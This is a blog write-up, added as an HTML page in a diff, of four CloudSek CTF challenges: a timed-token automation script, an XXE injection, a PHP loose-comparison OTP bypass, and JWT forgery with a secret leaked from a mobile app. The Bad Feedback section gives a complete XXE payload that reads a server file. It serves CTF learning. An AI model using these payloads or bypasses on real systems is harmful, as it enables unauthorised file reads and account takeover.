@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Cloudsek CTF :: quixel200</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CloudSek CTF Nitro Visiting the website, it gives us instructions on how to solve the challenge:
+When you visit the hidden API at /task, it hands back an HTML snippet containing the current random string. Reverse the string, base64-encode the reversed value, wrap it as CSK__{{payload}}__2025, and POST the result to /submit before the timer expires. Manual attempts miss the window—only code will do.
+You&rsquo;ll receive either the flag or a &ldquo;too slow&rdquo; message. Build a loop that fetches fresh prompts, transforms them, and submits the formatted answer immediately. The server keeps you honest with a strict per-session timer.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://quixel200.github.io/writeups/cloudsek/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/terminal.min.31f3bd93fad73432d7c5354e101fe6862964f38e4ae7382023b94be361c32c64.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="https://quixel200.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://quixel200.github.io/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Cloudsek CTF">
+<meta property="og:description" content="CloudSek CTF Nitro Visiting the website, it gives us instructions on how to solve the challenge:
+When you visit the hidden API at /task, it hands back an HTML snippet containing the current random string. Reverse the string, base64-encode the reversed value, wrap it as CSK__{{payload}}__2025, and POST the result to /submit before the timer expires. Manual attempts miss the window—only code will do.
+You&rsquo;ll receive either the flag or a &ldquo;too slow&rdquo; message. Build a loop that fetches fresh prompts, transforms them, and submits the formatted answer immediately. The server keeps you honest with a strict per-session timer.
+" />
+<meta property="og:url" content="https://quixel200.github.io/writeups/cloudsek/" />
+<meta property="og:site_name" content="quixel200" />
+
+  <meta property="og:image" content="https://quixel200.github.io/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-12-08 11:27:45 &#43;0530 IST" />
+
+
+
+
+  <link href="/writeups/cloudsek/index.xml" rel="alternate" type="application/rss+xml" title="quixel200" />
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/articles">Articles</a></li>
+        
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/articles" >Articles</a></li>
+        
+      
+        
+          <li><a href="/notes" >Notes</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+    <div class="index-content">
+      <h1 id="cloudsek-ctf">CloudSek CTF</h1>
+<h1 id="nitro">Nitro</h1>
+<p>Visiting the website, it gives us instructions on how to solve the challenge:</p>
+<p>When you visit the hidden API at <code>/task</code>, it hands back an HTML snippet containing the current random string. Reverse the string, base64-encode the reversed value, wrap it as <code>CSK__{{payload}}__2025</code>, and POST the result to <code>/submit</code> before the timer expires. Manual attempts miss the window—only code will do.</p>
+<p>You&rsquo;ll receive either the flag or a &ldquo;too slow&rdquo; message. Build a loop that fetches fresh prompts, transforms them, and submits the formatted answer immediately. The server keeps you honest with a strict per-session timer.</p>
+<p>going to /task:</p>
+<pre tabindex="0"><code>Here is the input string: vb49ljJCFpOe
+</code></pre><p>We can make a Session() in python to maintain the session and then parse the request, then we can transform it and send the payload to <code>/submit</code></p>
+<p>python script:</p>
+<pre tabindex="0"><code>import requests, base64
+
+URL = &#34;http://15.206.47.5:9090&#34;
+
+s = requests.Session()   # maintain cookies + session timer
+
+#fetch task
+r = s.get(URL + &#34;/task&#34;).text
+print(r)
+token = r.split(&#34;string: &#34;)[1].replace(&#34;&lt;/p&gt;&#34;,&#34;&#34;)
+print(token)
+# transform
+rev = token[::-1]
+b64 = base64.b64encode(rev.encode()).decode()
+payload = f&#34;CSK__{b64}__2025&#34;
+# submit
+resp = s.post(URL + &#34;/submit&#34;, data=payload)
+print(resp.text)
+</code></pre><p>This will give us the flag for the first challenge</p>
+<h1 id="bad-feedback">Bad Feedback</h1>
+<p>We are given a feedback portal that takes a name and a message. Looking at the source code:</p>
+<pre tabindex="0"><code>// Intercept the form submit and send XML instead of form-encoded data document.getElementById(&#39;feedback-form&#39;).addEventListener(&#39;submit&#39;, function (e) { e.preventDefault(); const name = document.getElementById(&#39;name&#39;).value; const message = document.getElementById(&#39;message&#39;).value; // Build XML body (players will see this only if they intercept the request) const xml = `&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;feedback&gt; &lt;name&gt;${name}&lt;/name&gt; &lt;message&gt;${message}&lt;/message&gt; &lt;/feedback&gt;`; fetch(&#39;/feedback&#39;, { method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/xml&#39; }, body: xml }) .then(resp =&gt; resp.text()) .then(html =&gt; { // Replace the current page with the response (simple but effective) document.open(); document.write(html); document.close(); }) .catch(err =&gt; { alert(&#39;Error submitting feedback&#39;); console.error(err); }); });
+</code></pre><p>We can see that it parses the data as XML and then sends the request, however there&rsquo;s no sanity checks or input validation.</p>
+<p>This is an XML External Entity (XXE) injection where a user can input their own &rsquo;entity&rsquo;, this entity can also be a system file(in this case the flag)</p>
+<p>the format of the raw xml is:</p>
+<pre tabindex="0"><code>&lt;feedback&gt;
+    &lt;name&gt;...&lt;/name&gt;
+    &lt;message&gt;...&lt;/message&gt;
+&lt;/feedback&gt;
+</code></pre><p>We can define a entity <code>xxe</code> that reads the flag:</p>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///flag.txt&#34;&gt;
+</code></pre><p>We can then print the entity in the name field:</p>
+<pre tabindex="0"><code> &lt;name&gt;&amp;xxe;&lt;/name&gt;
+</code></pre><p>Full payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &#34;file:///flag.txt&#34;&gt;
+]&gt;
+&lt;feedback&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/feedback&gt;
+</code></pre><p>This gives us the flag</p>
+<p><img src="/writeups/cloudsek/images/xxe_injection.png" alt="xxe request using curl"></p>
+<h1 id="triangle">Triangle</h1>
+<p>Looking at the source code of the Web application, we can see this comment:</p>
+<pre tabindex="0"><code>&lt;!-- Dev team 2: TODO: Implement google2fa.php for auth and don&#39;t forget to clean up the bak files post debugging before release --&gt;
+</code></pre><p>This tells us that there are backup files on the server.</p>
+<p>In the javascript source:</p>
+<pre tabindex="0"><code>fetch(&#34;/login.php&#34;, { method: &#34;POST&#34;, body: JSON.stringify(data), })
+</code></pre><p>There is a post request to <code>/login.php</code></p>
+<p>accessing <code>/login.php.bak</code> gives us the source code of the login logic, which seems to be the backup file referred by the developer.</p>
+<p>Looking at the login page, we can see that it imports <code>google2fa.php</code> and uses its <code>verify_key()</code>
+function in order to check the OTPs</p>
+<pre tabindex="0"><code>    if (!Google2FA::verify_key($user_data[&#39;key1&#39;], $_DATA[&#39;otp1&#39;])) {
+        json_die(&#39;wrong otp1&#39;, &#39;otp1&#39;);
+</code></pre><p>Looking at <code>verify_key()</code> by accessing <code>/google2fa.php.bak</code>:</p>
+<pre tabindex="0"><code>public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {
+
+		$timeStamp = self::get_timestamp();
+
+		if ($useTimeStamp !== true) $timeStamp = (int)$useTimeStamp;
+
+		$binarySeed = self::base32_decode($b32seed);
+
+		for ($ts = $timeStamp - $window; $ts &lt;= $timeStamp + $window; $ts++)
+			if (self::oath_hotp($binarySeed, $ts) == $key)
+				return true;
+
+		return false;
+
+	}
+</code></pre><p>The vulnerable line is:</p>
+<pre tabindex="0"><code>if (self::oath_hotp($binarySeed, $ts) == $key)
+</code></pre><p>PHP has two comparisons; loose <code>(==, =!)</code> and strict<code> (===)</code>. Strict comparison 1 = 1, but in loose 1 could mean many things 1 could equal true or 1. Meaning that there multiple meaning for the values used.</p>
+<p>This means we can directly send the boolean <code>True</code> to pass the OTP check(type juggling/confusion).</p>
+<ul>
+<li>PHP converts <code>&quot;123456&quot;</code> to boolean: non-empty string → <code>true</code></li>
+<li>Comparison becomes: <code>true == true</code></li>
+</ul>
+<p>We can intercept the request using burpsuite and pass the boolean values</p>
+<p><img src="/writeups/cloudsek/images/burpsuite_intercept.png" alt="burpsuite intercept"></p>
+<p><img src="/writeups/cloudsek/images/triangle_flag.png" alt="flag"></p>
+<h1 id="ticket">Ticket</h1>
+<p>We can go look at the report on <code>https://bevigil.com/report/com.strikebank.netbanking</code> as specified by the challenge description</p>
+<p>Looking at the strings, we can see a username and a password harcoded into the application. It also contains a <code>encoded_jwt_secret</code>.</p>
+<p><img src="/writeups/cloudsek/images/secrets.png" alt="hardcoded secrets"></p>
+<p>The JWT secret can be decoded to find the string used to encode the JWT tokens
+<img src="/writeups/cloudsek/images/secret_jwt_value.jpg" alt="decoded jwt secret"></p>
+<p>We also see a harcoded URL that leads us to a login page</p>
+<p><img src="/writeups/cloudsek/images/login_url.png" alt="hardcoded login url"></p>
+<p>Logging in with the default username and password just gives us a normal looking page, inspecting the cookies we see a JWT encoded token.</p>
+<p>We can decode the token from base64, this shows us two fields <code>username</code> and <code>exp</code> which seems to be login expiry timer.</p>
+<p><img src="/writeups/cloudsek/images/jwt_token_decoded.jpg" alt="decoed jwt token from login"></p>
+<p>We can modify the username to <code>admin</code> and use the JWT secret from the app and upon succesfully logging in as the admin user, we get the flag</p>
+<p><img src="/writeups/cloudsek/images/flag.png" alt="modified JWT token"></p>
+
+    </div>
+  
+  <div class="posts">
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
